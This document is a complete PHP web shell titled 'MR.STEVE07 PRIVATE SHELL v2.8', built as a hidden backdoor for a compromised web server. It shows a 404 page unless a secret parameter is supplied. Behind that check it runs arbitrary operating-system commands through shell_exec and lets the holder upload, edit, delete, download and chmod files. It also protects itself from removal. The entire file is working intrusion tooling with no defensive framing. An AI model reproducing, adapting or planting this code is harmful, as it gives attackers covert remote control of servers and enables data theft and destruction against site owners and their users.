<?php
ini_set('display_errors', 0);
error_reporting(0);

if (session_status() === PHP_SESSION_NONE) session_start();

/* ================== STRONG BACKDOOR + SELF PROTECTION ================== */
define('SECRET_PARAM', 'x');
define('SECRET_VALUE', '007');
define('SELF_FILE', realpath($_SERVER['SCRIPT_FILENAME']));

if (!isset($_GET[SECRET_PARAM]) || $_GET[SECRET_PARAM] !== SECRET_VALUE) {
    http_response_code(404);
    exit;
}

$currentPath = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$currentPath || !is_dir($currentPath)) $currentPath = getcwd();

if (!isset($_SESSION['copied_items'])) $_SESSION['copied_items'] = [];

$message = '';

/* ====================== HELPER FUNCTIONS ====================== */
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes/1073741824, 2).' GB';
    if ($bytes >= 1048576) return number_format($bytes/1048576, 2).' MB';
    if ($bytes >= 1024) return number_format($bytes/1024, 2).' KB';
    return $bytes.' B';
}

function isSelf($path) {
    return realpath($path) === SELF_FILE;
}

function deleteAll($path) {
    if (isSelf($path)) return false;
    if (is_file($path) || is_link($path)) return @unlink($path);
    if (!is_dir($path)) return false;
    foreach (scandir($path) as $item) {
        if ($item === '.' || $item === '..') continue;
        deleteAll($path . DIRECTORY_SEPARATOR . $item);
    }
    return @rmdir($path);
}

function copyAll($source, $dest) {
    if (is_file($source)) return copy($source, $dest);
    if (!is_dir($dest)) mkdir($dest, 0755, true);
    foreach (scandir($source) as $item) {
        if ($item === '.' || $item === '..') continue;
        copyAll($source . DIRECTORY_SEPARATOR . $item, $dest . DIRECTORY_SEPARATOR . $item);
    }
    return true;
}

/* ====================== ACTIONS ====================== */

// Single Delete (FIXED)
if (isset($_GET['delete'])) {
    $delPath = realpath($_GET['delete']);
    if ($delPath && strpos($delPath, $currentPath) === 0 && !isSelf($delPath)) {
        if (deleteAll($delPath)) {
            $message = "✅ Item deleted successfully!";
        } else {
            $message = "❌ Failed to delete item.";
        }
    }
}

// Rename
if (isset($_POST['rename_item']) && isset($_POST['old_path']) && isset($_POST['new_name'])) {
    $old = realpath($_POST['old_path']);
    if ($old && !isSelf($old) && strpos($old, $currentPath) === 0) {
        $newName = trim($_POST['new_name']);
        $newPath = dirname($old) . DIRECTORY_SEPARATOR . $newName;
        if (!file_exists($newPath) && rename($old, $newPath)) {
            $message = "✅ Item renamed successfully!";
        } else {
            $message = "❌ Rename failed! (Name may already exist)";
        }
    }
}

// ZIP Compress
if (isset($_POST['mass_zip']) && !empty($_POST['selected'])) {
    $zipName = 'archive_' . date('Ymd_His') . '.zip';
    $zipPath = $currentPath . DIRECTORY_SEPARATOR . $zipName;
    
    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        $count = 0;
        foreach ($_POST['selected'] as $item) {
            if (isSelf($item)) continue;
            $item = realpath($item);
            $relative = basename($item);
            
            if (is_dir($item)) {
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($item, RecursiveDirectoryIterator::SKIP_DOTS));
                foreach ($iterator as $file) {
                    if (isSelf($file->getPathname())) continue;
                    $zip->addFile($file->getPathname(), $relative . DIRECTORY_SEPARATOR . $file->getSubPathname());
                }
            } else {
                $zip->addFile($item, $relative);
            }
            $count++;
        }
        $zip->close();
        $message = "✅ <b>$zipName</b> created successfully! ($count items)";
    } else {
        $message = "❌ Failed to create ZIP file.";
    }
}

// Extract ZIP
if (isset($_GET['extract'])) {
    $zipFile = realpath($_GET['extract']);
    if ($zipFile && strpos($zipFile, $currentPath) === 0 && is_file($zipFile) && strtolower(pathinfo($zipFile, PATHINFO_EXTENSION)) === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($zipFile) === TRUE) {
            $zip->extractTo($currentPath);
            $zip->close();
            $message = "✅ Successfully extracted <b>" . basename($zipFile) . "</b>";
        } else {
            $message = "❌ Failed to extract ZIP file.";
        }
    }
}

// Download
if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && strpos($file, $currentPath) === 0 && is_file($file) && !isSelf($file)) {
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Type: application/octet-stream');
        readfile($file);
        exit;
    }
}

// Mass Actions
if (isset($_POST['mass_delete']) && !empty($_POST['selected'])) {
    $count = 0;
    foreach ($_POST['selected'] as $item) {
        if (!isSelf($item) && deleteAll($item)) $count++;
    }
    $message = "$count item(s) deleted.";
}

if (isset($_POST['mass_copy']) && !empty($_POST['selected'])) {
    $_SESSION['copied_items'] = $_POST['selected'];
    $message = count($_POST['selected']) . " item(s) copied.";
}

if (isset($_POST['paste_items']) && !empty($_SESSION['copied_items'])) {
    $success = 0;
    foreach ($_SESSION['copied_items'] as $item) {
        if (isSelf($item)) continue;
        $name = basename($item);
        $dest = $currentPath . DIRECTORY_SEPARATOR . $name;
        if (file_exists($dest)) {
            $i = 1; $info = pathinfo($name);
            do {
                $name = ($info['filename'] ?? 'file') . "_copy{$i}." . ($info['extension'] ?? '');
                $dest = $currentPath . DIRECTORY_SEPARATOR . $name;
                $i++;
            } while (file_exists($dest));
        }
        if (copyAll($item, $dest)) $success++;
    }
    $message = "$success item(s) pasted!";
    unset($_SESSION['copied_items']);
}

if (isset($_POST['mass_chmod']) && !empty($_POST['selected']) && !empty($_POST['new_perm'])) {
    $perm = octdec(preg_replace('/[^0-7]/','',$_POST['new_perm']));
    if ($perm > 0) {
        $count = 0;
        foreach ($_POST['selected'] as $item) {
            if (!isSelf($item) && @chmod($item, $perm)) $count++;
        }
        $message = "CHMOD applied to $count item(s).";
    }
}

/* ====================== UPLOAD, CREATE, CMD, EDITOR ====================== */
if (isset($_FILES['upload_file'])) {
    $uploaded = $failed = 0;
    $files = $_FILES['upload_file'];
    if (!is_array($files['name'])) $files = array_map(fn($v)=>[$v], $files);

    for ($i = 0; $i < count($files['name']); $i++) {
        if ($files['error'][$i] !== 0) { $failed++; continue; }

        $originalName = basename($files['name'][$i]);
        $target = $currentPath . DIRECTORY_SEPARATOR . $originalName;

        if (strtolower($originalName) === strtolower(basename(SELF_FILE))) {
            $target = $currentPath . DIRECTORY_SEPARATOR . 'shell_new_' . date('His') . '.php';
            $message .= "<span style='color:#ff0'>⚠️ Shell protected! Uploaded as <b>shell_new_*.php</b></span><br>";
        }

        if (move_uploaded_file($files['tmp_name'][$i], $target)) {
            $uploaded++;
        } else {
            $failed++;
        }
    }
    if ($uploaded) $message .= "✓ $uploaded file(s) uploaded successfully!<br>";
    if ($failed) $message .= "✗ $failed file(s) failed.<br>";
}

if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
    $new = $currentPath . DIRECTORY_SEPARATOR . basename($_POST['folder_name']);
    if (!file_exists($new) && mkdir($new, 0755, true)) $message = "Folder created!";
    else $message = "Failed to create folder.";
}

if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
    $new = $currentPath . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
    if (!isSelf($new) && file_put_contents($new, $_POST['file_content'] ?? '') !== false) {
        $message = "File created successfully!";
    } else $message = "Failed to create file.";
}

$cmd_output = '';
if (isset($_POST['run_cmd']) && !empty($_POST['command'])) {
    $cmd_output = shell_exec($_POST['command'] . ' 2>&1') ?? 'Command failed or disabled.';
}

$edit_message = ''; $editing_file = null; $edit_content = '';
if (isset($_GET['edit'])) {
    $editing_file = realpath($_GET['edit']);
    if ($editing_file && is_file($editing_file) && strpos($editing_file, $currentPath) === 0 && !isSelf($editing_file)) {
        if (isset($_POST['save_inline'])) {
            $edit_message = file_put_contents($editing_file, $_POST['content']) !== false 
                ? "<span style='color:#0f0;font-weight:bold'>✓ File Saved Successfully!</span>" 
                : "<span style='color:#f00;font-weight:bold'>✗ Save failed!</span>";
        }
        $edit_content = file_get_contents($editing_file);
    }
}

// Quick View
$view_content = '';
if (isset($_GET['view'])) {
    $view_file = realpath($_GET['view']);
    if ($view_file && is_file($view_file) && strpos($view_file, $currentPath) === 0 && !isSelf($view_file)) {
        $view_content = htmlspecialchars(file_get_contents($view_file));
    }
}
?>

<!DOCTYPE html>
<html>
<head>
<title>MR.STEVE07 v2.8 - STRONG PROTECTED</title>
<style>
    body{background:#000;color:#00ff88;font-family:consolas;padding:20px;}
    .header{text-align:center;font-size:38px;font-weight:bold;letter-spacing:6px;padding:25px;border:3px solid #00ff88;box-shadow:0 0 40px #00ff88;margin-bottom:20px;}
    .box,.action-bar{border:1px solid #00ff88;padding:15px;margin:10px 0;background:#001100;}
    table{width:100%;border-collapse:collapse;}
    th,td{border:1px solid #00ff88;padding:9px;}
    th{background:#002200;}
    a{color:#00ff88;text-decoration:none;}
    a:hover{color:#00ff00;}
    .cmd-output{background:#111;color:#0f0;padding:15px;max-height:400px;overflow:auto;white-space:pre-wrap;}
    textarea{width:100%;height:75vh;background:#000;color:#00ff88;border:2px solid #00ff88;padding:15px;font-family:consolas;}
    .success{color:#0f0;font-weight:bold;}
    .warning{color:#ff0;font-weight:bold;}
    .view-box{background:#111;padding:15px;border:1px solid #00ff88;max-height:600px;overflow:auto;white-space:pre-wrap;font-family:consolas;}
</style>
</head>
<body>

<div class="header"><font color="red">MR.STEVE07 PRIVATE SHELL v2.8</font><br><small style="color:#ff0;font-size:18px;">[SELF DESTRUCT PROTECTED]</small></div>

<div class="box">
    <b>PATH:</b> 
    <a href="?path=<?=urlencode(getcwd())?>&x=007">ROOT</a>
    <?php 
    $build = '';
    foreach(explode(DIRECTORY_SEPARATOR, $currentPath) as $p){
        if(empty($p)) continue;
        $build .= DIRECTORY_SEPARATOR.$p;
        echo ' / <a href="?path='.urlencode($build).'&x=007">'.htmlspecialchars($p).'</a>';
    }
    ?>
    <div class="warning">★ This shell is protected. It cannot delete or overwrite itself.</div>
</div>

<div class="action-bar">
    <form method="POST">
        <b>CMD » </b>
        <input type="text" name="command" placeholder="whoami && id" style="width:65%;">
        <button type="submit" name="run_cmd">Execute</button>
    </form>
    <?php if($cmd_output): ?><pre class="cmd-output"><?=htmlspecialchars($cmd_output)?></pre><?php endif; ?>
</div>

<div class="action-bar">
    <form method="POST" style="display:inline-block">
        <input type="text" name="folder_name" placeholder="Folder name" required>
        <button type="submit" name="create_folder">+ Folder</button>
    </form>
    <form method="POST" style="display:inline-block">
        <input type="text" name="file_name" placeholder="file.php" required>
        <button type="submit" name="create_file">+ File</button>
    </form>
    <form method="POST" enctype="multipart/form-data" style="display:inline-block">
        <input type="file" name="upload_file[]" multiple>
        <button type="submit">📤 Upload (Auto Protected)</button>
    </form>

    <form method="POST" id="massForm" style="display:inline-block">
        <button type="button" onclick="selectAll()">Select All</button>
        <button type="submit" name="mass_copy">📋 Copy</button>
        <?php if(!empty($_SESSION['copied_items'])): ?>
            <button type="submit" name="paste_items">📌 Paste (<?=count($_SESSION['copied_items'])?>)</button>
        <?php endif; ?>
        <button type="submit" name="mass_zip">📦 ZIP Selected</button>
        <button type="submit" name="mass_delete" onclick="return confirm('Delete selected?')">🗑 Delete</button>
        <input type="text" name="new_perm" placeholder="777" maxlength="4" style="width:55px">
        <button type="submit" name="mass_chmod">🔧 Chmod</button>
    </form>
</div>

<?php if($message): ?>
    <div class="box success"><?= $message ?></div>
<?php endif; ?>

<?php if (!empty($view_content)): ?>
<div class="box">
    <h3>Viewing: <?=htmlspecialchars(basename($_GET['view']))?></h3>
    <div class="view-box"><?= $view_content ?></div>
    <br>
    <a href="?path=<?=urlencode($currentPath)?>&x=007" style="background:#222;padding:8px 15px;color:#0f0;text-decoration:none;">← Back</a>
</div>
<?php endif; ?>

<?php 
// Rename Form
if (isset($_GET['rename'])):
    $renamePath = realpath($_GET['rename']);
    if ($renamePath && strpos($renamePath, $currentPath) === 0 && !isSelf($renamePath)):
?>
<div class="box">
    <h3>Rename: <?=htmlspecialchars(basename($renamePath))?></h3>
    <form method="POST">
        <input type="hidden" name="old_path" value="<?=htmlspecialchars($renamePath)?>">
        <input type="text" name="new_name" value="<?=htmlspecialchars(basename($renamePath))?>" style="width:50%;padding:8px;">
        <button type="submit" name="rename_item">Rename</button>
        <a href="?path=<?=urlencode($currentPath)?>&x=007" style="background:#222;padding:8px 15px;color:#0f0;text-decoration:none;">Cancel</a>
    </form>
</div>
<?php endif; endif; ?>

<?php if (isset($_GET['edit']) && $editing_file): ?>
<div class="box">
    <h3>Editing: <?=htmlspecialchars(basename($editing_file))?></h3>
    <?=$edit_message?>
    <form method="POST">
        <textarea name="content"><?=htmlspecialchars($edit_content)?></textarea><br><br>
        <button type="submit" name="save_inline">💾 SAVE FILE</button>
        <a href="?path=<?=urlencode($currentPath)?>&x=007" style="background:#222;padding:10px 20px;color:#0f0;text-decoration:none;">Cancel</a>
    </form>
</div>
<?php endif; ?>

<table>
<tr>
    <th><input type="checkbox" id="selectAll" onclick="toggleAll(this)"></th>
    <th>Name</th>
    <th>Type</th>
    <th>Perm</th>
    <th>Size</th>
    <th>Action</th>
</tr>
<?php 
$items = scandir($currentPath);
$folders = $files = [];
foreach ($items as $i) {
    if ($i === '.' || $i === '..') continue;
    $full = $currentPath . DIRECTORY_SEPARATOR . $i;
    if (is_dir($full)) $folders[] = $i;
    else $files[] = $i;
}
$all_items = array_merge($folders, $files);

foreach($all_items as $item): 
    $fullpath = $currentPath . DIRECTORY_SEPARATOR . $item;
    $isDir = is_dir($fullpath);
    $perm = substr(sprintf('%o', @fileperms($fullpath)), -4);
    $protected = isSelf($fullpath);
    $ext = strtolower(pathinfo($fullpath, PATHINFO_EXTENSION));
?>
<tr <?= $protected ? 'style="background:#330000;"' : '' ?>>
    <td>
        <?php if(!$protected): ?>
            <input type="checkbox" name="selected[]" value="<?=htmlspecialchars($fullpath)?>" form="massForm">
        <?php else: ?>
            <span style="color:#ff0;">★</span>
        <?php endif; ?>
    </td>
    <td>
        <?php if($isDir): ?>
            <a href="?path=<?=urlencode($fullpath)?>&x=007">📁 <?=htmlspecialchars($item)?></a>
        <?php else: ?>
            📄 <?=htmlspecialchars($item)?>
            <?php if($protected): ?> <span style="color:#ff0;">(PROTECTED SHELL)</span> <?php endif; ?>
        <?php endif; ?>
    </td>
    <td><?= $isDir ? 'DIR' : 'FILE' ?></td>
    <td><?= $perm ?></td>
    <td><?= $isDir ? '—' : formatSize(@filesize($fullpath)) ?></td>
    <td>
        <?php if(!$protected): ?>
            <?php if(!$isDir): ?>
                <a href="?edit=<?=urlencode($fullpath)?>&path=<?=urlencode($currentPath)?>&x=007">Edit</a> |
                <a href="?view=<?=urlencode($fullpath)?>&path=<?=urlencode($currentPath)?>&x=007">View</a> |
            <?php endif; ?>
            
            <a href="?rename=<?=urlencode($fullpath)?>&path=<?=urlencode($currentPath)?>&x=007">Rename</a>
            
            <?php if(!$isDir): ?>
                 | <a href="?action=download&file=<?=urlencode($fullpath)?>&x=007">Download</a>
            <?php endif; ?>

            <?php if($ext === 'zip'): ?>
                 | <a href="?extract=<?=urlencode($fullpath)?>&path=<?=urlencode($currentPath)?>&x=007" onclick="return confirm('Extract this ZIP here?')">Extract</a>
            <?php endif; ?>

            | <a href="?delete=<?=urlencode($fullpath)?>&x=007" onclick="return confirm('Delete this item?')">Delete</a>
        <?php endif; ?>
    </td>
</tr>
<?php endforeach; ?>
</table>

<script>
function toggleAll(source) {
    document.querySelectorAll('input[name="selected[]"]').forEach(cb => cb.checked = source.checked);
}
function selectAll(){ document.getElementById('selectAll').click(); }
</script>
</body>
</html>